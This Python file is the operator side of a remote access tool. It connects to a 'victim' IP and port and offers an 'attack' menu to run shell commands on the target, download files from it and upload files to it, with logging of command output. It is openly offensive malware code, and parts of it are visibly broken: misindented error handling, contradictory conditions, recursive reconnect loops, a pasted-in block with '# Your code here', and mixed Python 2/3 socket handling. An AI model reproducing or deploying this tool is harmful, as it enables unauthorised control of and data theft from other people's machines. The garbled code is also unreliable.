#!/usr/bin/env python
# coding: utf-8

# Libraries import
import os
import sys
import socket
import re
import errno
import pickle


# checking file/directory match
def find(name, path):
	for root, dirs, files in os.walk(path):
		if name in files:
			return os.path.join(root, name)


# input colors class
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


# input for client connection parameters
def inputConnection():
	try:
		victimIP = input("Specify the IP address of the target system : ")
		victimPort = input("Specify the available port : ")
		return victimIP, victimPort
	except KeyboardInterrupt:
		print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)
		victimIP = ""
		victimPort = ""
		return victimIP, victimPort
		sys.exit()


# check for valid IP address
def valid_ip(address):
	if address != "":
		try:
			socket.inet_aton(address)
			return True
		except socket.error as v:
			errorcode = v[0]
			print(
				bcolors.FAIL + "Connection failed to the server\n[*] Error : Illegal IP address string passed to inet_aton" + bcolors.ENDC)
			sys.exit()


# Check for connection to the victim
def inputConnectionCheck(host, port):
	# regex for connection TCP port parameter
	PortRegexp = r"^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
	valid_ip(host)
	if valid_ip(host) and re.match(PortRegexp, str(port)) is not None:
		global clientSocket
		clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		port = int(port)
		try:
			clientSocket.settimeout(10)
			clientSocket.connect((host, port))
			clientSocket.settimeout(None)
			print(bcolors.OKGREEN + "[*] Connection to the server {} successfully established".format(host))
			return clientSocket
		except socket.error as v:
			errorcode = v[0]
			if errorcode == errno.ECONNREFUSED:
				print(bcolors.FAIL + "[*] Connection failed to the server\n[*] Error : Connection refused, please verify if target script is running\n" + bcolors.WARNING + "[*] Else, verify if the connection port is the same as mentioned in the target script ! " + bcolors.ENDC)
		host, port = inputConnection()
		inputConnectionCheck(host, port)
		if errorcode == errno.ETIMEDOUT:
			print(bcolors.FAIL + "[*] Connection failed to the server\n[*] Error : Connection timed out" + bcolors.ENDC)
			host, port = inputConnection()
			inputConnectionCheck(host, port)
		if errorcode == errno.EHOSTUNREACH:
			print(bcolors.FAIL + "[*] Connection failed to the server\n[*] Error : No route to host" + bcolors.ENDC)
			host, port = inputConnection()
			inputConnectionCheck(host, port)
		if errorcode == errno.EINVAL:
			print(
				bcolors.FAIL + "[*] Connection failed to the server\n[*] Error : Accept() failed due to invalid arguments" + bcolors.ENDC)
			host, port = inputConnection()
			inputConnectionCheck(host, port)
		if errorcode != errno.EINVAL and errorcode != errno.EHOSTUNREACH and errorcode == errno.ETIMEDOUT and errorcode == errno.ECONNREFUSED:
			print(bcolors.FAIL + "[*] Connection failed to the server\n[*] Error {}".format(errorcode) + bcolors.ENDC)
			host, port = inputConnection()
			inputConnectionCheck(host, port)

host = "127.0.0.1"
PortRegex = r"\d{1,5}"  # Example regular expression pattern
port = 8080
if valid_ip(host) and re.match(PortRegex, str(port)) is None:
    # Your code here
    print(bcolors.FAIL + "[*] Connection failed to the server\n[*] Error: please specify valid parameters" + bcolors.ENDC)
    host, port = inputConnection()
inputConnectionCheck(host, port)


# Panel menu
def menu():
	try:
		print(
			bcolors.OKBLUE + "======REMOTE ACCESS TOOL PANEL======\n[1] - Run commands on the target\n[2] - Download a file from the target\n[3] - Upload a file on the target" + bcolors.ENDC)
		global choice
		choice = input("(Press 1,2 or 3) >> ")
		if choice == "1" or choice == "2" or choice == "3":
			return choice
		else:
			choice = "0"
			return choice
	except KeyboardInterrupt:
		print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)
		sys.exit()


# Loop for attack 1
def attack1Loop():
	while 1:
		try:
			commande = input("Enter a command to run (\"exit\" to quit) >>  ")
			if commande != "":
				clientSocket.sendall(commande);
				outputCommand = clientSocket.recv(16384)
				print(bcolors.OKGREEN + outputCommand + bcolors.ENDC)
				file1 = open('output.log', 'ab')
				file1.write(outputCommand)
				file1.close()
			else:
				print(bcolors.OKBLUE + "[*] No command sent...\n[*] Closing Socket" + bcolors.ENDC)
				break
		except KeyboardInterrupt:
			print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)
			break


# First type of attack
def attack1(clientSocket):
	i = input("Do you want to create a log file ? ([y]/n) : ") or "y"
	if i == "yes" or i == "y" or i == "Y" or i == "Yes":
		cwdir = os.getcwd()
		if os.path.exists("output.log"):
			anotherF = input(
				bcolors.OKGREEN + "[*] The ""\"output.log""\" file already exists, do you want to overwrite it ? ([y]/n) : " + bcolors.ENDC) or "y"
			if anotherF == "yes" or anotherF == "y" or anotherF == "Y" or anotherF == "Yes":
				print(bcolors.OKGREEN + "[*] Let's overwrite it !" + bcolors.ENDC)
				os.remove("output.log")
				attack1Loop()
			if anotherF == "no" or anotherF == "n" or anotherF == "N" or anotherF == "No":
				print(
					bcolors.WARNING + "[*] By default, standard output will be written into existing ""\"output.log\""" file" + bcolors.ENDC)
				attack1Loop()
		if not os.path.exists("output.log"):
			print(
				bcolors.OKGREEN + "[*] The ""\"output.log""\" file will be created in current working directory (""\"" + cwdir + "\")" + bcolors.ENDC)
			attack1Loop()
	if i == "no" or i == "n" or i == "N" or i == "No":
		print(bcolors.OKGREEN + "[*] No trace file will be created during this session" + bcolors.ENDC)
		while 1:
			try:
				commande = input("Enter a command to run (Ctrl+c to quit) >> ")
				if commande != "":
					clientSocket.sendall(commande);
					outputCommand = clientSocket.recv(16384)
					print(bcolors.OKGREEN + outputCommand + bcolors.ENDC)
				else:
					print(bcolors.OKBLUE + "[*] No command sent...\n[*] Closing Socket" + bcolors.ENDC)
					break
			except KeyboardInterrupt:
				print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)
				break


# Second type of attack (Dl)
def attack2(clientSocket):
	try:
		waitFilename = clientSocket.recv(256)
		serverFilename = input(waitFilename)
		if serverFilename != "":
			cwd = os.getcwd()
			if os.path.exists(cwd + "/" + serverFilename):
				overwriteFile = input(
					bcolors.OKGREEN + "[*] The \"" + serverFilename + "\" file already exists, do you want to overwrite it ? ([y]/n) : " + bcolors.ENDC) or "y"
				if overwriteFile == "yes" or overwriteFile == "y" or overwriteFile == "Y" or overwriteFile == "Yes":
					os.remove(serverFilename)
				if overwriteFile == "no" or overwriteFile == "n" or overwriteFile == "N" or overwriteFile == "No":
					print(bcolors.WARNING + "\n[*] Aborting : Closing system..." + bcolors.ENDC)
					sys.exit()
			clientSocket.sendall(serverFilename)
			serverFiledata = "tmp"
			while 1:
				serverFileData = clientSocket.recv(4096)
				if serverFileData == "unknown":
					print(
						bcolors.WARNING + "[*] ""\"" + serverFilename + "\""" file not found in the current working directory of the victim" + bcolors.ENDC)
					data = pickle.loads(clientSocket.recv(4096))
					print(bcolors.WARNING + "[*] Voici les fichiers présents : " + bcolors.ENDC)
					for r in data:
						print(bcolors.OKGREEN + r + bcolors.ENDC)
					serverFilename = input(waitFilename)
					if serverFilename in data:
						clientSocket.sendall(serverFilename)
						downloadedFile = open(cwd + "/" + serverFilename, "wb")
						# Importing data in the new file
						dataFromServer = clientSocket.recv(16384)
						downloadedFile.write(dataFromServer)
						downloadedFile.close()
						print(
							bcolors.OKGREEN + "[*] ""\"" + serverFilename + "\""" file successfully downloaded !" + bcolors.ENDC)
						break
					else:
						print(
							bcolors.WARNING + "[*] Warning : ""\"" + serverFilename + "\""" file not found in current working directory (""\"" + cwd + "\""")""" + bcolors.ENDC)
						print(bcolors.WARNING + "\n[*] Aborting : Closing system..." + bcolors.ENDC)
				else:
					downloadedFile = open(cwd + "/" + serverFilename, "wb")
					# Importing data in the new file
					try:
						downloadedFile.write(serverFileData)
						downloadedFile.close()
					except:
						print("Error writing")
					print(
						bcolors.OKGREEN + "[*] ""\"" + serverFilename + "\""" file successfully downloaded !" + bcolors.ENDC)
				break
				sys.exit()
	except KeyboardInterrupt:
		print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)


#  Third type of attack (Upld)
def attack3(clientSocket):
	waitFilename = clientSocket.recv(256)
	clientFilename = input(waitFilename)
	if clientFilename != "":
		curWorkDir = os.getcwd()
		if os.path.exists(curWorkDir + "/" + clientFilename):
			clientSocket.sendall(clientFilename)
			known = clientSocket.recv(256)
			if known == "0":
				openingFile = open(curWorkDir + "/" + clientFilename, "rb")
				readingFile = openingFile.read(40000)
				clientSocket.sendall(readingFile)
			if known == "1":
				a = input(
					bcolors.WARNING + "[*] The ""\"" + clientFilename + "\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : " + bcolors.ENDC) or "y"
				if a == "no" or a == "n" or a == "N" or a == "No":
					print(bcolors.WARNING + "\n[*] Aborting : Closing system..." + bcolors.ENDC)
					clientSocket.sendall("0")
					sys.exit()
				if a == "yes" or a == "y" or a == "Y" or a == "Yes":
					clientSocket.sendall("1")
					openingFile = open(curWorkDir + "/" + clientFilename, "rb")
					readingFile = openingFile.read(40000)
					clientSocket.sendall(readingFile)
					openingFile.close()
			uploadStatus = clientSocket.recv(256)
			print(bcolors.OKGREEN + uploadStatus + bcolors.ENDC)

		if not os.path.exists(curWorkDir + "/" + clientFilename):
			print(
				bcolors.WARNING + "[*] Warning : ""\"" + clientFilename + "\""" file not found in current working directory (""\"" + curWorkDir + "\""")""" + bcolors.ENDC)
			print(bcolors.WARNING + "[*] Voici les fichiers présents :" + bcolors.ENDC)
			for root, dirs, files in os.walk(curWorkDir):
				for r in files:
					print(r)
			clientFilename = input(waitFilename)
			if find(str(clientFilename), curWorkDir):
				clientSocket.sendall(clientFilename)
				known = clientSocket.recv(256)
				if known == "0":
					openingFile = open(curWorkDir + "/" + clientFilename, "rb")
					readingFile = openingFile.read(40000)
					clientSocket.sendall(readingFile)
				if known == "1":
					a = input(
						bcolors.WARNING + "[*] The ""\"" + clientFilename + "\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : " + bcolors.ENDC) or "y"
					if a == "no" or a == "n" or a == "N" or a == "No":
						print(bcolors.WARNING + "\n[*] Aborting : Closing system..." + bcolors.ENDC)
						clientSocket.sendall("0")
						sys.exit()
					if a == "yes" or a == "y" or a == "Y" or a == "Yes":
						clientSocket.sendall("1")
						openingFile = open(curWorkDir + "/" + clientFilename, "rb")
						readingFile = openingFile.read(40000)
						clientSocket.sendall(readingFile)
						openingFile.close()
				uploadStatus = clientSocket.recv(256)
				print(bcolors.OKGREEN + uploadStatus + bcolors.ENDC)
			else:
				print(
					bcolors.WARNING + "[*] Warning : ""\"" + clientFilename + "\""" file not found in current working directory (""\"" + curWorkDir + "\""")""" + bcolors.ENDC)
				print(bcolors.OKBLUE + "\n[*] Aborting : Closing system..." + bcolors.ENDC)
				sys.exit()
	else:
		print(bcolors.FAIL + "[*] An error occured during file transfer !" + bcolors.ENDC)
		print(bcolors.FAIL + "[*] Error : No filename found !\n[*] Please specify it " + bcolors.ENDC)


# Attack panel menu
def attackPanel(clientSocket, choice):
	try:
		if choice == "1":
			clientSocket.sendall("1")
			attack1(clientSocket)
		if choice == "2":
			clientSocket.sendall("2")
			attack2(clientSocket)
		if choice == "3":
			clientSocket.sendall("3")
			attack3(clientSocket)
	except KeyboardInterrupt:
		print(bcolors.WARNING + "\n[*] Keyboard interruption : Closing socket..." + bcolors.ENDC)


# Check connection to display attack panel menu
def validMenu(clientSocket):
	try:
		a = clientSocket.recv(256)
		if a == "up":
			menu()
	except:
		print(bcolors.FAIL + "[*] Error : No response from target socket" + bcolors.ENDC)


# closing socket
def closeClientSocket():
	clientSocket.shutdown(socket.SHUT_RDWR)
	clientSocket.close()


def main():
	try:
		host, port = inputConnection()
		inputConnectionCheck(host, port)
		validMenu(clientSocket)
		attackPanel(clientSocket, choice)
		while 1:
			menu()
			attackPanel(clientSocket, choice)
	except KeyboardInterrupt:
		pass
	# sys.exit()
	closeClientSocket()
	print(bcolors.OKBLUE + "[*] Closing system..." + bcolors.ENDC)


if __name__ == "__main__":
	main()
